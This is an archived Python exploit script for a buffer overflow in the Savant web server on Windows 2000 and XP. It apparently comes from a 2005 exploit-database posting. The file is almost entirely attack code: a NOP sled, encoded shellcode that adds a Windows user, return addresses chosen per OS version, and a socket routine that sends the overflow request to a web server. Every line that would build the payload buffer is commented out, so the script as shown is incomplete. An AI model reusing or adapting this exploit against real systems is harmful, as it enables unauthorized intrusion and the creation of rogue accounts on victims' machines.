#########################################################
#                                                       #
# Savant web server Buffer Overflow Exploit             #
# Discovered by : Mati Aharoni                          #
# Coded by : Tal Zeltzer and Mati Aharoni               #
# www.see-security.com                                  #
# FOR RESEACRH PURPOSES ONLY!                           #
# FRench Win OS support by Jerome Athias                #
#########################################################
import struct
import socket
sc = "\x90" * 21	#We need this number of nops
# win32_adduser - PASS=pwd EXITFUNC=thread USER=X Size=232 Encoder=PexFnstenvSub http://metasploit.com
sc += "\x31\xc9\x83\xe9\xcc\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
sc += "\x23\x73\xe4\x83\xeb\xfc\xe2\xf4\x24\xcb\x35\xe4\xd8\x23\xf8\xa1"
sc += "\xe4\xa8\x0f\xe1\xa0\x22\x9c\x6f\x97\x3b\xf8\xbb\xf8\x22\x98\x07"
sc += "\xf6\x6a\xf8\xd0\x53\x22\x9d\xd5\x18\xba\xdf\x60\x18\x57\x74\x25"
sc += "\x12\x2e\x72\x26\x33\xd7\x48\xb0\xfc\x27\x06\x07\x53\x7c\x57\xe5"
sc += "\x33\x45\xf8\xe8\x93\xa8\x2c\xf8\xd9\xc8\xf8\xf8\x53\x22\x98\x6d"
sc += "\x84\x07\x77\x27\xe9\xe3\x17\x6f\x98\x13\xf6\x24\xa0\x2c\xf8\xa4"
sc += "\xd4\xa8\x03\xf8\x75\xa8\x1b\xec\x31\x28\x73\xe4\xd8\xa8\x33\xd0"
sc += "\xdd\x5f\x73\xe4\xd8\xa8\x1b\xd8\x87\x12\x85\x84\x8e\xc8\x7e\x8c"
sc += "\x37\xed\x93\x84\xb0\xbb\x8d\x6e\xd6\x74\x8c\x03\x30\xcd\x8c\x1b"
sc += "\x27\x40\x1e\x80\xf6\x46\x0b\x81\xf8\x0c\x10\xc4\xb6\x46\x07\xc4"
sc += "\xad\x50\x16\x96\xf8\x7b\x53\x94\xaf\x47\x53\xcb\x99\x67\x37\xc4"
sc += "\xfe\x05\x53\x8a\xbd\x57\x53\x88\xb7\x40\x12\x88\xbf\x51\x1c\x91"
sc += "\xa8\x03\x32\x80\xb5\x4a\x1d\x8d\xab\x57\x01\x85\xac\x4c\x01\x97"
sc += "\xf8\x7b\x53\xcb\x99\x67\x37\xe4";
sc += "AA"
# Win2k SP0,1,2,3,4 (US...)
#Change Return address as needed
#buf = "\xEB\x19" + " /" + sc + struct.pack("<L",0x750236b2) + "\r\n\r\n"

#0x74FA2AC4		pop esi - pop - ret	ws2help.dll	Win 2K SP4 FR (Found with findjmp2 by Class101 ;)
#buf = "\x90" * 24 + " /" + sc + struct.pack("<L",0x74fa2ac5) + "\r\n\r\n"	#EB becomes CB...? so i changed it by nops

#Win XP SP2 FR?
#0x719E260D		pop esi - pop - ret	ws2help.dll	Win XP SP2 FR (Found with findjmp2 by Class101 ;)
#buf = "\x90" * 24 + " /" + sc + struct.pack("<L",0x719e260e) + "\r\n\r\n"	#EB becomes CB...? so i changed it by nops


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',80))
s.send(buf)
s.close()

# milw0rm.com [2005-02-15]
